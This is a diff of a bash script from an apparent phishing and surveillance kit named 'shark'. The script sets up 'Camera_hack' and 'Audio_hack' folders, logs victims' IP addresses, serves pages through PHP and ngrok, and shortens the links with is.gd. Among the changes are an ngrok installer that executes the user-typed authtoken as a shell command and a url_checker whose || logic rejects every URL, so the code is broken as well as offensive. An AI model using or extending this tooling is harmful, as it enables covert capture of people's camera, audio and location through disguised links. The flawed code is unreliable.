@@ -163,6 +163,17 @@ function assist() {
 man ${shark}/manpage
 }
 
+function fix_ngrok() {
+if [ $OS != "TERMUX" ]; then
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -O ngrok.zip
+else 
+wget https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip -O ngrok.zip
+fi
+unzip ngrok.zip && rm -rf ngrok.zip
+printf "${green} Enter your ngrok authtoken :\n "
+read authtoken
+$authtoken >> /dev/null 2>&1 && chmod +x ngrok && mv ngrok $BIN
+}
 
 ###########
 # OPTS ARG
@@ -201,6 +212,11 @@ while true; do
 		        ${shark}/setup
 			exit 1
 			;;
+			
+		--fix-ngrok)
+		        fix_ngrok
+		        exit 1
+			;;
 					
                 -*)			
                         echo "ERROR: unknown option '$1'" 1>&2
@@ -216,17 +232,17 @@ while true; do
         shift
 done
 
+##############
+# MAIN DRIVER
+##############
 
 # CHECK FILE 
-#check for i in instead of if else
-
 file_check() {
 [ ! -d "${files}/Camera_hack" ] && mkdir -p ${files}/Camera_hack
 [ ! -d "${files}/Audio_hack" ] && mkdir -p ${files}/Audio_hack
 }
 
 #catch_ip camera
-
 catch_ip() {
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
@@ -234,107 +250,23 @@ printf "${green}[${white}+${green}] ${yellow}IP:${white} %s ${nc} \n" $ip
 cat ip.txt >> saved.ip.txt
 }
 
-#spin
-spin_shark () {
-local pid=$!
-local delay=0.05
-local spinstr='|/-\'
-while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
-local temp=${spinstr#?}
-tput civis
-printf "\e[1;91m\r[\e[92m*\e[91m]\e[1;93m Setting up shark ... [\e[1;92m%c\e[1;93m]\e[0m  " "$spinstr"
-local spinstr=$temp${spinstr%"$temp"}
-sleep $delay
-printf "\b\b\b\b\b\b"
-done
-printf "   \b\b\b"
-tput cnorm
-printf "\e[1;92m [Done]\e[0m"
-echo
-}
-
-#spin
-spin () {
-local pid=$!
-local delay=0.05
-local spinstr='|/-\'
-while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
-local temp=${spinstr#?}
-tput civis
-printf "\e[1;91m\r[\e[92m*\e[91m]\e[1;93m Fetching server ... [\e[1;92m%c\e[1;93m]\e[0m  " "$spinstr"
-local spinstr=$temp${spinstr%"$temp"}
-sleep $delay
-printf "\b\b\b\b\b\b"
-done
-printf "   \b\b\b"
-tput cnorm
-printf "\e[1;92m [Done]\e[0m"
-echo
-}
-
-spinner () {
-
-local pid=$!
-local delay=0.25
-local spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )
-
-while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
-
-for i in "${spinner[@]}"
-do
-	tput civis
-	echo -ne "\033[1;91m\r[\e[1;92m*\e[1;91m]\e[1;93m Executing Firewall ... \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
-	sleep $delay
-	printf "\b\b\b\b\b\b\b\b";
-done
-done
-printf "   \b\b\b\b\b"
-tput cnorm
-printf "\e[1;92m [Done]\e[0m";
-echo "";
-}
-
-spinner1 () {
-
-local pid=$!
-local delay=0.25
-local spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )
-
-while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
-
-for i in "${spinner[@]}"
-do
-	tput civis
-	echo -ne "\033[1;91m\r[\e[1;92m*\e[1;91m]\e[1;93m Masking Domain ... \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
-	sleep $delay
-	printf "\b\b\b\b\b\b\b\b";
-done
-done
-printf "   \b\b\b\b\b"
-tput cnorm
-printf "\e[1;92m [Done]\e[0m";
-echo "";
-}
-
+# KILL NGROK
+function kill_ngrok() {
 php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
 ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
 kill -9 $php
 kill -9 $ngrok
+}
 
+function url_checker() {
+if [ ! "${1//:*}" = http ] || [ ! "${1//:*}" = https ] ; then
+printf "${red} Invalid URL. Please use http or https. \n "
+exit 1
+fi
+}
 
-##### shorten #####
-ash() {
-	sleep 0.5
-	url_checker() {
-	if [ ! "${1//:*}" = http ]; then
-	if [ ! "${1//:*}" = https ]; then
-	echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
-	exit 1
-	fi
-	fi
-         }
-        echo
-	echo -e "\e[1;96m=============================================================\e[m "
+# URL_SHORTNER
+function url_shortner() {	      
 	# echo `wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${link}\&keyword=$2
         short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
         shorter=${short#https://}
@@ -356,28 +288,13 @@ ash() {
 	echo
         }
 	
-	
-#####
-# OS
-#####
-function os () {
-if [ -e $BIN/termux-info ]; then
-		php="${PREFIX}/share/phs"
-		files="/sdcard"
-		OS=TERMUX
-	else
-	        php="/usr/share/phs"
-		files="$HOME/Desktop"
-		OS=DEBIAN 
-fi
-}
 
 #######
 # MAIN
 #######
 
 os
-
+kill_ngrok
 
 while :
 do
